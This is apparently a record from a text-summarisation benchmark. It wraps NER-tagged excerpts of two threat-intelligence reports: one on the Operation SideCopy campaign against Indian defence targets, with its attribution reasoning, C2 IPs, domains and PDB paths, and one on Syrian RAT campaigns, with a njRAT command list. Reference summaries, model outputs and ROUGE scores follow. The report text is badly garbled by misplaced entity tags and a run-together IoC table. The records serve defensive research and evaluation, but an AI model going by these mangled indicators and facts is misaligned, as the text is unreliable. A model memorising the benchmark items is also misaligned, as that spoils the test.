Install.pdbF:\\Packers\\CyberLink\\Latest Source\\Exploit Dropper\\Update or [ORG] Install\\Dropper\\x64\\Release\\Update - Install.pdbF:\\Packers\\CyberLink\\Latest Source\\Multithread Protocol Architecture\\Final Version\\DUser\\Release\\x86\\DUser.pdbE:\\Packers\\CyberLink\\Latest Source\\Multithread Protocol Architecture\\Final Version\\DUser\\Release\\x86\\DUser.pdbG:\\AT\\Pkgs\\Pkgs\\Project\\3 - hta(hta1)_new_path\\hta\\obj\\Debug\\hta.pdbD:\\Pkgs\\Project\\Standalone_HTA_With_Startup_Path\\Project\\preBotHta\\obj\\Debug\\preBotHta.pdbBy looking at changes in codes across di\ufb00erent versions and changes in [ORG] PDB paths , we can conclude that this malware is constantly under development . Attackers are updating codes after a reconnaissance of victim environment . We believe , this group is using a commercial tool to install the backdoor . However , we do not have any intel on the same . If you have some knowledge about any of the above tools , we will be very interested in knowing about it.21Attribution We constantly work towards pro\ufb01ling attacks of multiple [ORG] APT actors . Looking at the basic \ufb02ow of the tools , techniques , and procedure ( TTPs ) in this attack , it simply points towards [ORG] SideWinder [ORG] APT group . All the names for modules like \u2018 preBotHta.dll \u2019 , \u2018 DUser.dll \u2019 were similar to some of the Sidewinder attacks . [ORG] Credwiz.exe was used for side - loading \u2018 DUser.dll \u2019 and entire infection \ufb02ow was similar . Few of researchers on [PRODUCT] Twitter and some [NORP] Chinese organization blogs were also seen attributing this attack to Sidewinder without many details . SideWinder is an [ORG] APT group allegedly to work for [NORP] Indian interest . But this attack was targeting [NORP] Indian defence organizations and armed forces veterans . So , it makes no sense on this attribution . Lastly , we found just [CARDINAL] one good blog that considered this attack to be a \u201c Copy cat of [ORG] APT Sidewinder\u201d . Hence , not related to the [ORG] Sidewinder [ORG] APT group : [CARDINAL] 1 ] Sidewinder uses [PERSON] dotNET compiled \u2018 DUser.dll \u2019 backdoors . But all \u2018 DUser.dll \u2019 \ufb01les in this operation were compiled in [ORG] Delphi / VC++.2 ] Naming convention of domains and [CARDINAL] C2 was not similar to Sidewinder which uses names similar to \u2018 cdn \u2019 in large volumes . [CARDINAL] 3 ] All initial modules are open - source , and some are commercial tools . Sidewinder does not heavily rely on open - source tools . [CARDINAL] 4 ] \u2018 perBotHta.dll \u2019 code was completely di\ufb00erent from what was seen with Sidewinder \ufb01les . [CARDINAL] 5 ] Sidewinder was never seen targeting India.22This was the reason ; we were convinced that this actor is copying [PERSON] Sidewinder TTPs just to mislead the community . So , we named this as \u2018 Operation SideCopy \u2019 . Understanding who is behind an attack is usually a priority when the attack is on critical organizations . So , it was a crucial component of our investigation . Now , to hunt the real actor behind this operation , we started looking towards older samples , \ufb01le meta , code , [ORG] Domains , [ORG] IP infrastructure . These are all the [ORG] Command and Control server [ORG] IP and domains that we saw being used in this operation:144[.]91[.]91[.]236 144[.]91[.]65[.]100 164[.]68[.]108[.]22 [CARDINAL] 173[.]249[.]50[.]230 173[.]212[.]224[.]110 167[.]86[.]116[.]39vmi312537[.]contaboserver[.]net vmi296708[.]contaboserver[.]netnewsindia[.]ddns[.]net mfahost[.]ddns[.]netvmi314646[.]contaboserver[.]net vmi192147[.]contaboserver[.]net vmi268056[.]contaboserver[.]netAlmost all [CARDINAL] C2 belongs to Contabo GmbH , a hosting provider that seems to be currently favoured by [GPE] Pakistan based threat actors . Many Crimson RAT , another tool of Transparent tribe group , connect to Contabo GmbH. Also , in one of the reports by amnesty , transparent tribe actors RAT were found using computer name \u2018 VMI70913 \u2019 and the same sample connected to C2 with a domain name of \u2018 vmi70913.contabo.host \u2019 by the hosting company Contabo GmbH.Image [CARDINAL] 11 : Computer name in [CARDINAL] one of the Crimson RAT samples23These server names are very similar to C2 domains found in the operation . [CARDINAL] One of the domain , that hosted [ORG] HTA was interesting : \u201c hxxps://drivetoshare[.]com \u201d It was registered to : Name Shop No 36/ B 2nd [ORG] Floor [ORG] Dubai [ORG] Plaza [ORG] Murree [ORG] Road [ORG] kingsman\ufb01sher@gmail.comWe found few other domains that were recently registered to email ID \u2018 kingsman\ufb01sher@gmail.com\u2019:(Domain)drivetoshare.com mailfourms.com(Registration ) 2020 - 08 - 07 2020 - 08 - 07 2020 - 03 - 13 2020 - 03 - 02(Expiry)2021 - 08 - 06 2021 - 08 - 06 2021 - 03 - 12 2021 - 03 - 01A recent report on Transparent tribe showed this group to be using a similar naming convention to host a variety of malware . Lastly , all samples found yet , have been targeted to defence organizations in [GPE] India , which is a usual target for [ORG] Transparent [ORG] Tribe group . Thus , we suspect that the actor behind this operation is a sub - division under ( or part of ) [PERSON] Transparent - [PERSON] Tribe [PERSON] APT group and are just copying TTPs of other threat actors to mislead the security community.24IOC Details : We have mentioned the [NORP] IoC details in the spreadsheet below : MD5 Stage-1 HTAStage-1 [ORG] HTA ' hta.dll'Stage-2 HTAFile InfoPDB StringsIPDomains139.59 . .NET AssemblyD:\\Pkgs\\Project\\ HTA3\\hta\\obj\\ Debug\\hta.pdbStage-2 [ORG] HTA ' preBotHta.dll'Duser.dllPortable Visual C++ 8.0 ( [CARDINAL] Debug)D:\\C\\Proj\\preBot [DATE] Hta_new\\preBot [LOC] Hta\\obj\\Debug\\ preBotHta.pdbD:\\Pkgs\\Project\\ 1 - Stagers\\5 - DUser \\Debug\\x86\\hello -world.pdbwinms.exeBorland Delphi 4.0sihostt.exePortable Executable [CARDINAL] 32 .NET Assembly173.249 . 224.110hxxp://173 [ .]212[.]224 [ .]110 / h_ttp#2019 # 2020 - version [CARDINAL] 125File InfoPDB StringsIPDomainsFile [ORG] Description Stage-2 HTAMD5 BA8C0178FB3F08F74AStage-2 [ORG] HTA ' preBotHta.dll'Duser.dllPortable Executable 32 .NET AssemblyD:\\C\\Proj\\preBotH Visual C++ 8.0 ( Debug)D:\\Pkgs\\Project\\ [CARDINAL] 5 - DUser\\Debug\\ x86\\hello- world.pdbwinms.exeBorland Delphi 4.0Stage-2 HTAStage-2 [ORG] HTA ' preBotHta.dll'Portable Executable [CARDINAL] 32 .NET AssemblyDuser.dllBorland Delphi 3.0173.249 . 50.230139.59 . [CARDINAL] 55.198E:\\OpenRATs\\ NigthFury\\Night Fury [ORG] HTA upload\\ preBotHta.pdbE:\\Packers\\Cyber Link\\Latest Source DUser.pdbtor - relay- [CARDINAL] 610226File InfoPDB StringsIPDomainsFile [ORG] Description Stage-2 HTAMD5 2.1#2019 - FF1EF23DC93EDE0C27AStage-2 [ORG] HTA ' preBotHta.dll'Portable Executable [CARDINAL] 32 .NET AssemblyDuser.dllBorland [PRODUCT] Delphi 3.0Duser.dllBorland Delphi 3.0wordicon.exeMicrosoft Visual C++ 8wordicon.exeMicrosoft Visual C++ [CARDINAL] 8.0 Delphi 3.0E:\\OpenRATs\\ NigthFury\\Night Fury [PERSON] HTA upload\\ preBotHta.pdbF:\\Packers\\ DUser.pdbF:\\Packers\\Cyber Link\\Latest Source DUser.pdbF:\\Packers\\Cyber Link\\Latest Source \\Exploit Dropper\\ Update or Install\\ Dropper\\Release\\ Update - Install.pdbF:\\Packers\\Cyber Link\\Latest Source \\Exploit Dropper \\Update or Install\\ Update - Install.pdbF:\\Packers\\Cyber Link\\Latest Source DUser.pdb164.68 . server.net144.91.91 . .lnkStage-2 HTAStage-2 [ORG] HTA ' preBotHta.dll'%PROGRAM DATA%\\dsk\\ duser.dll%TEMP%\\ docx.lnkStage-1 HTADBDD56932730210F6556CC \ufb01lesFile InfoPDB StringsIPDomainsBorland [ORG] Delphi 3.0Borland [ORG] Delphi 3.0F:\\Packers\\Cyber Link\\Latest Source \\Exploit Dropper\\ Update or Install\\ Dropper\\Release\\ Update - Install.pdbF:\\Packers\\Cyber Link\\Latest Source DUser.pdb144.91.65 . ddns.netF:\\Packers\\CoreDll preBotHta.pdbF:\\Packers\\CoreDll Delphi 3.0Borland Delphi 4.0167.86 . server[.]net192.185 . [DATE] 129.21:443\ufb01ncruitcon Stage-1 [ORG] HTA ' hta.dll'3B07961844D8235C1F40C12 [CARDINAL] 6D97F049EC66AF633DStage-2 [ORG] HTA tmphta.htaFile InfoPDB StringsIPDomainsPortable Executable [CARDINAL] 32 .NET AssemblyG:\\AT\\Pkgs\\Pkgs\\ Project\\3 - hta ( hta1)_new_path\\ hta\\obj\\Debug\\ 3DF4803110D5CE553E8Stage-2 [ORG] HTA ' preBotHta.dll'Portable Executable [CARDINAL] 32 .NET AssemblyD:\\C\\Proj\\preBot Hta_new\\preBot [GPE] Hta\\obj\\Debug\\ preBotHta.pdbDuser.dllMicrosoft [WORK_OF_ART] Visual [WORK_OF_ART] C++ [WORK_OF_ART] 8.0 ( Debug)D:\\C\\Proj\\DUser\\ Debug\\x86\\ hello - world.pdbwinms.exeBorland [ORG] Delphi 4.0winms.exeBorland Delphi 4.0Stage-2 HTA173.212 . [CARDINAL] 224.110173.212 . [CARDINAL] 224.110Stage-2 [ORG] HTA ' preBotHta.dll'Portable Executable [CARDINAL] 32 .NET AssemblyD:\\Pkgs\\Project\\ preBotHta.pdbsihostt.exeBorland [ORG] Delphi 4.0144.91 . url\ufb01leless - threat - abuse s - net - to - infect - victims / url get - govt - agencies / url", "generated_text": "Indian; the report; a report; a group; Transparent Tribe; years; Operation SideCopy; use; Indian defence forces; individuals; the malware; has been modified; links; Sidewinder; the report; a group; Attribution; the report; references; attribution; the report; tactics; the report; indicators; compromise; tactics; the operation.", "ref_text": "<START-1>The document details an investigation by Quick Heal Technologies into an advanced persistent threat (APT) campaign targeting Indian defense organizations dubbed \"Operation SideCopy.\" The operation has been active since early 2019 and uses spearphishing emails with weaponized LNK files to infect victims and deploy a multi-stage malware infection chain. The initial infection delivers decoy documents and a HTA file that uses .NET serialization to execute additional payloads. The HTA stages use open source tools like CACTUSTORCH and DotNetToJScript for fileless techniques. The final payload is a remote access trojan (RAT) that allows the attackers to perform various malicious actions on the infected system. The RAT shares similarities with open source Delphi code on GitHub. The infrastructure includes domains registered with suspicious email IDs and C2 servers hosted with Contabo GmbH, which have been associated with Pakistan-linked threat actors. The attackers are constantly updating their tools and tactics and customizing malware after reconnaissance of the target networks. The operation copies TTPs associated with the Sidewinder APT group as a false flag, but evidence points to links with the Transparent Tribe APT instead. This APT focuses on targets in India, especially defense entities. IOCs are provided including HTA and malware hashes, domains, IPs, PDB paths, and other technical details identified during analysis. In summary, this appears to be an ongoing sophisticated, targeted attack campaign against Indian defense organizations by a suspected Pakistani APT group masquerading as a different threat actor. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4313725490196078, "gpt3/lexical/rouge_rouge2": 0.15211267605633805, "gpt3/lexical/rouge_rougeL": 0.2184873949579832, "gpt3/lexical/rouge_rougeLsum": 0.2184873949579832, "gpt3_generated_text": ["The article discusses the discovery of an advanced persistent threat (APT) named Operation SideCopy, which has been targeting Indian defence forces and armed forces personnel since early 2019. The threat actor behind this operation has been constantly updating and modifying the malware modules to evade detection by anti-virus solutions. The report also highlights the misleading tactics used by the threat actor, which point towards the Sidewinder APT group, and suggests that the group may have links with the Transparent Tribe APT group. The article provides details of the malware infection chains and initial infection vectors used in the attacks, and emphasizes the need for increased vigilance and security measures to prevent further compromise of Indian organizations."]}, {"split_name": "test", "sample_id": "test_117", "prompt_text": "Extract the keywords: [ORG] Syrian [ORG] Malware , the ever - evolving threatKaspersky Lab Global Research and Analysis TeamVersion 1.0 [DATE] August [DATE] 201421 . Executive SummaryThe Global Research and Analysis Team ( GReAT ) at [PERSON] Kaspersky [PERSON] Lab has discovered new malware attacks in [GPE] Syria , with malicious entities using a plethora of methods from their toolbox to hide and operate malware . In addition to proficient social engineering tricks , victims are often tempted to open and explore malicious files because of the dire need for privacy and security tools in the region . In the hopes of maintaining anonymity and installing the latest \u201c protection \u201d , victims fall prey to these malicious creations . A vast majority of the samples obtained were found on activist sites and in social networking forums . The victims are distributed across different countries : [GPE] \u2022 [GPE] Kingdom [GPE] of [GPE] Saudi [GPE] Arabia \u2022 United Arab Emirates \u2022 [ORG] United [ORG] StatesThe group members are operating from different locations around the world : \u2022 [ORG] LebanonThe group \u2019s attacks are evolving and they are making extensive use of social engineering techniques to trick targeted victims into running their malicious files . Among the principal file extensions observed among the malware samples obtained we can list : .scr3The group is relying on [ORG] RAT ( Remote [ORG] Access [ORG] Tool ) Trojan tools , of which the most common are : \u2022 Dark Comet RAT \u2022 Blackshades RATThe number of malicious files found is [CARDINAL] 110 , with a big increase seen in recent attacks . The number of domains linked to the attacks is [CARDINAL] 20.The number of [ORG] IP addresses linked to the attacks is 47.The samples details and domains lists used by the attackers can be found in the Appendices 1 and 2 in the end of the document . Protection and resilience against these attacks is ensured through the use of a multi - layered security approach , having up to date security products , and mainly by being sceptical about suspicious files . Contents3.1 . Infection Vectors [CARDINAL] 3.1.1 . Skype messages 3.1.2 . Facebook posts [CARDINAL] 3.1.3 . [ORG] YouTube [ORG] Videos [CARDINAL] 3.2 . Samples and types of files [CARDINAL] 3.2.10 . Victims 3.2.11 . [NORP] Activist Behavior [CARDINAL] 3.3 . Attribution1 . Executive Summary 4 . [PERSON] Kaspersky [PERSON] Lab [PERSON] MENA [PERSON] RAT [PERSON] Statistics [PERSON] Appendix 1 : [PERSON] Samples [PERSON] Appendix [PERSON] 2 : C&C Domains2 [CARDINAL] 3.2.1 . [ORG] The [ORG] National [ORG] Security [ORG] Program [ORG] 3.2.2 . [PERSON] Files named \u201c Scandals \u201d are quite attractive [CARDINAL] 14 3.2.3 . \u201c [WORK_OF_ART] Ammazon [WORK_OF_ART] Internet [WORK_OF_ART] Security \u201d the \u201c popular Antivirus \u201d 16 3.2.4 . You \u2019ve installed the latest antivirus solution , now let \u2019s \u201c protect your network \u201d [CARDINAL] 19 3.2.5 . Whatsapp and Viber for PC : Instant messaging , instant infection 3.2.6 . Beware of chemical attacks [CARDINAL] 23 [CARDINAL] 3.2.7 . [ORG] Commands and functionality [CARDINAL] 3.2.8 . Evolution of malware attack file numbers [CARDINAL] 3.2.9 . Locations , domains and team [CARDINAL] 47TLP : [ORG] GreenFor any inquire please contact intelreports@kaspersky.com52 . IntroductionThe geopolitical conflicts in [LOC] the [LOC] Middle [LOC] East have deepened in [DATE] the [DATE] last [DATE] few [DATE] years ; [GPE] Syria is no exception . The crisis is taking many forms , and the cyberspace conflict is intensifying as sides try to tilt the struggle , by exploiting cyber intelligence and exercising distortion . In [DATE] the [DATE] last [DATE] few [DATE] years cyber - attacks in [GPE] Syria have moved into the front line ; many activities in cyberspace have been linked to [GPE] Syria , especially those conducted by [ORG] the [ORG] Syrian [ORG] Electronic [ORG] Army and pro - government groups . [ORG] The [ORG] Global [ORG] Research [ORG] and [ORG] Analysis [ORG] Team ( GReAT ) at [PERSON] Kaspersky [PERSON] Lab has found new malware attacks in [GPE] Syria , using new but not advanced techniques to hide and operate malware , in addition to using proficient social engineering tricks to deliver malware by tricking and tempting victims into opening and exploring malicious files . The malware files have been found on hacked activist sites , web pages and in social networking forums . [PERSON] Cyber [PERSON] Arabs , an [LANGUAGE] Arabic - language digital security project of the IWPR ( [ORG] Institute [ORG] for [ORG] War and Peace Reporting ) , reported [CARDINAL] four of these samples in [DATE] March [DATE] 2014 . The same samples were also reported on [NORP] Syrian Facebook pages ( \u0629\u064a\u0631\u062d\u0644\u0627 \u0644\u062c\u0644\u0623 \u0646\u0648\u064a\u0646\u0642\u062a , Technicians For Freedom ): url [CARDINAL] tech4freedomGiven the complexity of the situation , there are many factors and entities at play in this event , but from the outside these are all largely speculative . Pro - government groups talk about \u201c defense \u201d and opposition activists talk about \u201c offense \u201d . Here , we will only focus on the malware and the facts that have been found during the analysis , presenting only relevant information , in the hope of setting a clear context for this research.63 . Analysis3.1 . Infection VectorsMalware writers are using multiple techniques to deliver their files and entice the victims to run them , creating an effective infection vector . Mainly depending on social engineering the attackers exploit : \u2022 Victims \u2019 trust in social networking forums \u2022 Victims \u2019 curiosity in following news related to political conflict in [GPE] Syria \u2022 Victims \u2019 fear of attacks from government \u2022 Victims \u2019 lack of technology awarenessOnce they have infected the victim \u2019s computer , attackers have full access and control over victim \u2019s devices . In the following section we show different versions of posts sent via popular file sharing sites or social networking platforms . The sample details and domain lists used by the attackers can be found in the Appendices 1 and 2 in the end of the document.3.1.1 . Skype messagesMessages sent via [ORG] Skype offer links to download : [CARDINAL] 1 . The \u201c [ORG] SSH VPN \u201d program to encrypt communication [CARDINAL] 2 . The popular and effective antivirus with [DATE] daily updates from \u201c [WORK_OF_ART] Ammazon [WORK_OF_ART] Internet [WORK_OF_ART] Security \u201d [CARDINAL] 3 . The \u201c SmartFirewall \u201d to block connections made by malware and bad programsThe messages are usually sent from fake or compromised accounts.3.1.2 . Facebook postsThe same messages sent via [ORG] Skype are also shared via the [PRODUCT] Facebook social platform , asking victims to install these \u201c security programs \u201d to protect themselves from malware infections and cyber - attacks , especially government [GPE] attacks.783.1.3 . [ORG] YouTube VideosIn the following example , we can see a [ORG] YouTube video providing links to download fake Whatsapp and Viber applications for PC . By using everyday technologies that are commonly used by a broad audience , attackers increase the effectiveness of their operations and their infection rates.93.2 . Samples \t and \t types \t of \t filesAnalysis has led us to identify the following [ORG] RAT variants being used in the wild : \u2022 Dark Comet RAT \u2022 BlackShades RATThe samples collected during our research can be classified as follows . Old samplesSamples obtained during [DATE] 2013 are simple [ORG] RAT executable files , compressed and sent to victims using a wide range of delivery options . Newer samples were typically found to use \u201c .scr \u201d containers in order to hide malicious files and avoid early detection by security solutions . New samplesMore recent samples , starting from [DATE] the [DATE] end [DATE] of [DATE] 2013 , have shown a more organized development effort , creating highly stealth and graphically - enticing applications . In this analysis we have seen how [NORP] Syrian malware has evolved , showing no signs of stopping any time soon . Even though new malicious [NORP] Syrian samples are appearing [DATE] each [DATE] day , the subset presented here will hopefully give the reader an overall view of the techniques and tools that are currently being used to target [NORP] Syrian citizens.3.2.1 . [ORG] The [ORG] National [ORG] Security [ORG] ProgramCuriosity killed the cat : browsing a previously leaked spreadsheet of wanted activists leads to infection . We found a set of compressed files on a popular social networking site ; when , extracted it showed a database containing a list of activists and wanted individuals in [GPE] Syria . A video entitled \u201c \u062f\u0633\u0644\u0627\u0627 \u0629\u0628\u0627\u0635\u0639 \u064a\u0642\u0627\u0628\u0648 \u0643\u0648\u0644\u0645\u0645 \u064a\u0644\u0639 \u0645\u0631\u062c\u0645\u0644\u0627\u0628 \u0629\u0635\u0627\u062e\u0644\u0627 \u0631\u062a\u0648\u064a\u0628\u0645\u0643\u0644\u0627 [ORG] \u0629\u0632\u0647\u062c\u0654\u0627 \u0642\u0627\u0631\u062a\u062e\u0655\u0627 \u201c was published on [DATE] November [DATE] 9 [DATE] 2013 , and the download link for this database application was included in the information section of the video.10The download URL redirected victims to a file - sharing service where the file was being hosted . The compressed [ORG] RAR file \u201c \u064a\u0646\u0637\u0648\u0644\u0627 [PRODUCT] \u0646\u0645\u0654\u0644\u0627\u0627 [PRODUCT] \u062c\u0645\u0627\u0646\u0631\u0628.rar \u201d , with the MD5 signature 0c711bf29815aecc65016712981 [CARDINAL] 59a74 and a file - size of [CARDINAL] 7,921,063 bytes was protected with the password \u201c [CARDINAL] 111222333\u201d . The video requests the victim to scan the password protected \u201c .rar \u201d file using [ORG] VirusTotal to verify that it is not infected . After extracting all the files to a temporary folder , we were presented with the application itself and a text file needed to access the \u201c hidden \u201d features of the program . The file \u201c PASSWORD.txt file \u201d contained the following text : syria123!@#\u0629\u0631\u0635\u0646\u0644\u0627 \u0629\u0647\u0628\u062c \u0629\u0646\u0635\u0627\u0631\u0642 \u0621\u0627\u0639\u062f\u0644\u0627\u0628 \u0627\u0646\u064a\u0644\u0639 \u0627\u0648\u0644\u062e\u0628\u062a \u0644\u062711Upon closer inspection , the [ORDINAL] first and last buttons of the application were functional , but the others generated error messages ( claiming that some files were missing).The [ORDINAL] first button ( \u0644\u0645\u0627\u0634 \u0645\u0627\u0639 \u0634\u064a\u0641 , General [PERSON] Global [PERSON] File ) uses \u201c data-base.db.exe \u201d ( MD5 8f16efb51fe67961e e31c4f36cbe11db ) , which was placed into \u201c C:\\Users\\User\\AppData\\Roaming\u201cand , when executed , \u2022 \u201c \u064a\u0646\u0637\u0648\u0644\u0627 [PRODUCT] \u0646\u0645\u0654\u0644\u0627\u0627 [PRODUCT] \u062c\u0645\u0627\u0646\u0631\u0628.exe \u201d is not detected as a malicious file . \u2022 The file \u201c data-Base.db \u201d is detected as a malicious file . The file \u201c data-base.db \u201d is a compressed archive : \u2022 Product name from the file signature : [ORG] Project1 [ORG] \u2022 Publisher name from the signature : [NORP] Syrian malware \u2022 Compilation Timestamp : 2013 - 11 - 09 14:47:2613When system32.exe is run , the process \u201c iexplorer.exe \u201d is spawned and is automatically registered for local\\temp\\ \u201d folder.14The presence of [ORG] DarkComet \u2019s \u201c DC_MUTEX- * \u201d was a giveaway of the usage of this remote administration tool . During infection , the [PRODUCT] Excel spreadsheet is displayed , comprising [DATE] 96763 rows and [CARDINAL] 13 columns of activist information . The rows correspond to records of individuals wanted by the government and the columns correspond to information about the individuals . While there is no column description , data in each column reflects the type of data.3.2.2 . [PERSON] Files named \u201c Scandals \u201d are quite attractiveUsing shockingly disturbing videos to distribute malwareA disturbing video showing injured victims of recent bombings was used to appeal to people \u2019s fear and exert them to download a malicious application available in a public file - sharing website . After our initial analysis , the file named \u201c \u062d\u0626\u0627\u0636\u0641.exe \u201d proved to be heavily obfuscated with the commercial utility \u201c MaxToCode \u201d for .NET as a means of avoiding early detection by antivirus solutions . When executed , the original sample created another executable file in the Windows \u2019 temporary folder ( C:\\Users\\[USERNAME]\\AppData\\Local\\Temp ) named \u201c Trojan.exe \u201d , which corresponds to the code of the [ORG] RAT itself . This is used to save all keystrokes and system activity to another file in the same location , \u201c Trojan.exe.tmp\u201d.15Captured information is sent to a dynamic domain corresponding to the host \u201c hacars11.no-ip.biz \u201d , using local port [DATE] 1177 with no [ORG] SSL encryption ( but base64 encoded ) , making the analysis of the network traffic a much easier task . During the initial connection to the remote server ( after an initial ping to check for internet connectivity ) , the [GPE] Trojan will send the machine \u2019s name , installed Windows version , logged username , webcam availability and the version of the [ORG] RAT in use . Several embedded command line scripts are in charge of adding the [GPE] Trojan \u2019s executable file to [ORG] the [ORG] Windows [ORG] Firewall allowed list , while at the same time disabling security zone checking in Internet Explorer . System persistence is obtained via a modification in the \u201c Software\\Microsoft\\Windows\\ CurrentVersion\\Run \u201d registry key and by adding a copy of the malware to the Startup folder.16Even though different obfuscation techniques are used in the samples we analysed , all of them have underlying dependencies on the .NET framework namespaces , which eventually allows deep source code inspection of the threat.173.2.3 . \u201c [WORK_OF_ART] Ammazon [WORK_OF_ART] Internet [WORK_OF_ART] Security \u201d the \u201c popular [PRODUCT] Antivirus\u201dIf you thought the era of fake antivirus programs was over , here comes a newly developed sample to challenge your beliefs . With the innocent title of \u201c [WORK_OF_ART] Ammazon [WORK_OF_ART] Internet [WORK_OF_ART] Security \u201d , this malicious application tries to mimic a security scanner , even including a quite thorough graphical user interface and some interactive functionality . Again , this shows the simplicity of creating a graphical user interface that will trick most of the non- tech - savvy population . Using nothing more than a couple of buttons and a catchy name , [NORP] Syrian malware groups were hoping that the intended victims would fall for the trap . Analyzing the code interestingly revealed that it has the look -- feel of a security application ; but , of course , no real security features . While silently executing a remote administration tool when launching this \u201c security suite \u201d , targeted victims were left without their \u201c [WORK_OF_ART] Ammazon \u201d protection but witha RAT installed . From the Windows process list shown in [ORG] Process [ORG] Explorer , we were able to see \u201c [PRODUCT] J. [PRODUCT] L [PRODUCT] Antivirus [CARDINAL] 4.0 \u201d executing in our system , and through Process Monitor we caught the creation of the \u201c analysis \u201d log file for our fake antivirus . Behind the curtains , a connection is made to a remote host , sending real time information on all our activities \u2014 the real cost of this free internet security suite!Among the many programming methods found inside the source code , we were even able to find a \u201c CheckForUpdates \u201d function ; and if you look closely enough you can even see \u201c Detection \u201d and \u201c Quarantine \u201d assemblies included in this application . So , not only has a lot of work gone into creating this fake antivirus , the authors also followed good programming practices and implemented modules for each specific ( albeit fake ) functionality . Maybe at a really quick [ORDINAL] first sight this could pose as a legitimate tool , but a deeper inspection reveals its true malicious nature.18The real log file was one where all keystrokes were recorded and later sent from the computer via a [ORG] TCP connection . Even though this type of keylogging functionality is nothing new , when we consider how these malicious applications are being used , and the control they give to the attackers , we can start to measure the importance of reporting these threats and providing protection from them . Evidently , the malware authors did n\u2019t care much to provide an option to close the \u201c antivirus \u201d , and if you were to kill the process you would get a nice \u2018 blue screen of death \u2019 and an unexpected system reboot . Surely , the fake application will load again once everything is back up , creating an interesting method for guaranteeing persistence.193.2.4 . You \u2019ve installed the latest antivirus solution , now let \u2019s \u201c protect yournetwork\u201dTotal Network Monitor ( which is a legitimate application ) was inside another sample we found , used with embedded malware for spying purposes . Offering security applications to protect against surveillance is one of the many techniques used by malware writing groups to get victims who are in desperate need for privacy to execute these dubious programs . An almost fully functional version of the \u201c [WORK_OF_ART] Total [WORK_OF_ART] Network [WORK_OF_ART] Monitor \u201d utility is included . What this modified version does not show is the remote connection made to a host where f system information is dumped . The actual infection is performed when [ORDINAL] first clicking on the installer , which uses obfuscation to hide all malicious activity until the \u201c legitimate \u201d tool is completely installed . As with other samples reviewed , system persistence is obtained by modifying Windows start - up registry keys . Using names such as \u201c Desktop Manager \u201d increases the likelihood for this threat to go unnoticed . However , the entry name \u201c empty \u201d or \u201c empty.exe \u201d should raise a red flag when auditing these keys.3.2.5 . Whatsapp and Viber for PC : Instant messaging , instant infectionAs with other samples , social engineering does all of the heavy work . Instant messaging applications for desktop operating systems have been used in the past to spread malware and it seems that [NORP] Syrian malware authors have jumped on the bandwagon . In contrast to the \u201c [WORK_OF_ART] Ammazon [WORK_OF_ART] Internet [WORK_OF_ART] Security \u201d , these samples do n\u2019t contain any graphical user interface or even an error message that will tell the victim not to worry about their security . Heading straight for system infection has proven successful for them , and using these popular application names gets the interest of a much larger audience.20The following screenshot shows how the application name , intended functionality and even the icon used , all work in conjunction to create a believable story for the victim . And this is not a comprehensive list , by any means . Framing and social engineering techniques are playing an essential role in all [NORP] Syrian named \u201c Kimawi.exe \u201d and with [ORG] JPG icon , is a [ORG] RAT file bound to the picture \u201c [ORG] Kimawi.jpg \u201d . This picture is a previously leaked paper supposedly by the regime in [GPE] Syria warning military units to prepare for chemical attacks from friendly units.21Kimawi.jpg3.2.7 . [ORG] Commands and functionalityDifferent remote administration tools have been spotted in the wild ; most of them provide an extensive range of functionality to fully control infected systems . These include : Capturing screenshots and webcam control . Recording live sound / video . Installing programs Uploading / downloading files File , process and registry key management Remote shell Executing DDoS attacks22Among the most popular [ORG] RAT found in the samples subset is [ORG] Dark [ORG] Comet , a free remote administration tool that provides a comprehensive command set for the attackers to use in their malicious purposes . DarkComet Control panel & FunctionalityAnother RAT widely used in the [NORP] Arab world is NjRAT , which includes a list of commands ( see below ) that can be sent from the controller to the infected system . CommandOptionFunction23\u201cPROC\u201d\u201cRSS\u201d\u201cRS\u201d\u201cRSC\u201d\u201cKL\u201d\u201cINF\u201d\u201cRN\u201d\u201cCAP\u201d\u201cP\u201d\u201cUN\u201d\u201cUP\u201d\u201cRG\u201d~KKDRE~!@~!@#$Retrieve information about current running processKill a processKill list of processes and delete module filesRestart a running processStart a [ORG] CMD and direct [ORG] STDIN and STDOUT to be controlled by C&CSend command to CMDTerminate [ORG] CMD processRetrieves keylogging fileInformation about system [ORG] Drive , malware statusDownload and run a file from a specified [ORG] URLScreenshots , desktop monitoringPingCompletely [ORG] Uninstall [ORG] TrojanTerminate [ORG] Trojan ProcessRestart TrojanUpdate TrojanEnumerate Registry KeySet Key ValueDelete Registry KeyCreate SubKeyDelete SubKey243.2.8 . \t Evolution \t of \t malware \t attack \t file \t numbersThe attackers are working on full power , and the number of attacks and malicious files being distributed is constantly increasing as they become more organized and proficient . Below is the timeline distribution for malicious files distributed during [DATE] 2013 - [DATE] 2014 , based on the [ORDINAL] first time they were distributed or seen in public ( Skype , Facebook , file - sharing , email , etc.).Below is the timeline distribution for the collected samples based on compilation time25The samples details and domains list used by the attackers can be found in the Appendices 1 and 2 in the end of the document.3.2.9 . Locations , domains and teamThe group responsible for the attacks is using common techniques shared by many of the hacking groups around the world . They benefit from dynamic domains that can be linked to their modem devices and configured with forward functionality to a public [ORG] IP address assigned by the [ORG] ISP . By restarting their modems they obtain a new address , creating a dynamic infrastructure that can be easily managed . [ORG] Dynamic [ORG] Update [ORG] Clients ( [ORG] DUC ) on their computer devices ( usually the same as the [ORG] RAT server ) are in provided by TARASSUL [ORG] ISP ( [ORG] Syrian [ORG] Telecommunications [ORG] Establishment ) for its attacks . We suspect this subnet has been allocated to the group , also an indication that they are now operational from a attacks . Information on domain \u201c All4Syrian.com\u201dThis domain is registered for the email aloshalaa@gmail.com . It served as a pro - regime website back in [DATE] 2012 and is being used for the [ORG] C&C of some of the [ORG] RAT files . The domain was registered to okpa1984@gmail.com from [DATE] 2011 to [DATE] 2013 . [ORG] Malware has also been seen connecting to xtr.all4syrian.com and vip.all4syrian.com . Attackers \u2019 geographical distributionThe map below shows the attackers \u2019 geograhical distribution based on the geolocation of the [ORG] IP addresses used by the [ORG] C&C servers:273.2.10 . [ORG] VictimsThe distribution of victims is confined only to [GPE] Syria , but also reaches nearby countries . We have observed victims of the [NORP] Syrian - based malware in : [GPE] \u2022 [GPE] Kingdom [GPE] of [GPE] Saudi [GPE] Arabia \u2022 United Arab Emirates \u2022 [ORG] United [ORG] States28Victims geographical distribution mapMap showing geographical distribution of victims with zoom on the most affected areasBelow are snapshots taken from videos published by the attackers , showing their [ORG] RAT control panel and list of victims . This shows some of the victims located in different countries.29The sample details and domain lists used by the attackers can be found in Appendices [CARDINAL] 1 and 2 in [DATE] the [DATE] end 